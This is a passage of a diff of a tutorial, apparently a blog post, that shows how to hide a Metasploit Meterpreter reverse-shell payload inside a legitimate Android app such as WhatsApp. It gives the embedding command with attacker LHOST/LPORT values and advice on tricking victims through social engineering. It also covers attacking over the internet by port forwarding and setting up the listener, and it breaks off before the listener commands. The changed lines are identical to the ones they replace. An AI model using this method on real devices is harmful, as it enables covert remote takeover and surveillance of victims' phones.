@@ -15,7 +15,7 @@ From Wikipedia,
 > The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research.
 
 
-In a more informal language, it’s a tool which we can use to perform various kinds of hacks against a machine. The flagship payload which comes with the Metasploit Framework is the _Meterpreter_, which also has an Android version that comes as an .apk file. In case you are wondering what a payload is, it’s a program we can install on a victim’s system to compromise it. Normally we have to install the Meterpreter payload in the victims phone by any means—usually involving Social Engineering—and when the victim runs the application, we would get a direct connection to that phone remotely and we can use it to wreak havoc on it.
+In a more informal language, it’s a tool which we can use to perform various kinds of hacks against a machine. The flagship payload which comes with the Metasploit Framework is the _Meterpreter_, which also has an Android version that comes as an .apk file. In case you are wondering what a payload is, it’s a program we can install on a victim’s system to compromise it. Normally we have to install the Meterpreter payload in the victims phone by any means—usually involving Social Engineering—and when the victim runs the application, we would get a direct connection to that phone remotely and we can use it to wreak havoc on it.
 
 But since the payload app doesn’t look very legit, takes up only a few kBs, and doesn’t show anything when clicked on, the victim will probably uninstall it right away, or worse, wouldn’t install it at all. So we have to solve that problem.
 
@@ -24,7 +24,7 @@ Here’s where this tutorial comes in. I’m gonna show you how to take any .apk
 
 ### Pre-requisites
 
-Just to be clear,  In this tutorial the operating system used is Kali Linux, which is a de facto standard OS for Penetration Testing—read, hacking. You should also install the latest version of _ApkTool_ and some libraries for the scripts to work properly.
+Just to be clear,  In this tutorial the operating system used is Kali Linux, which is a de facto standard OS for Penetration Testing—read, hacking. You should also install the latest version of _ApkTool_ and some libraries for the scripts to work properly.
 
 To install the required libraries, enter this command at the console —
 ```console
@@ -49,9 +49,9 @@ Open a terminal, and type the following command:
 $ ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
 ```
 
-In this example I’ve used 192.168.0.104 as the Local IP address, i.e. your IP address and 4895 as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the `LPORT` can be set to any reasonable port no.
+In this example I’ve used 192.168.0.104 as the Local IP address, i.e. your IP address and 4895 as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the `LPORT` can be set to any reasonable port no.
 
-_NOTE_. If you are going to conduct this attack over the internet, be sure to put your public IP, not your local IP, in the `LHOST` option. You also may need to forward the port you’re using for this attack to work properly.
+_NOTE_. If you are going to conduct this attack over the internet, be sure to put your public IP, not your local IP, in the `LHOST` option. You also may need to forward the port you’re using for this attack to work properly.
 
 Once you run the command, if you are lucky, the script will do everything by itself and complete the whole process. But more than often it cannot determine to which Activity of the app it should bind the payload to, so it asks you to select it. In that case, leave the terminal open with the script at the prompt, and browse to `/root/original`.
 
@@ -67,7 +67,7 @@ This is the hardest step of all, so I’m posting some screenshots to make your 
 
 ### PROFIT?!
 
-If you did everything correctly, you should now get an .apk file in your root directory with the name `backdoored_WhatsApp.apk`. It will install and run just like the original app.
+If you did everything correctly, you should now get an .apk file in your root directory with the name `backdoored_WhatsApp.apk`. It will install and run just like the original app.
 
 As for the listener, you should use `multi/handler` and set the corresponding options accordingly. Just run the following commands —
 
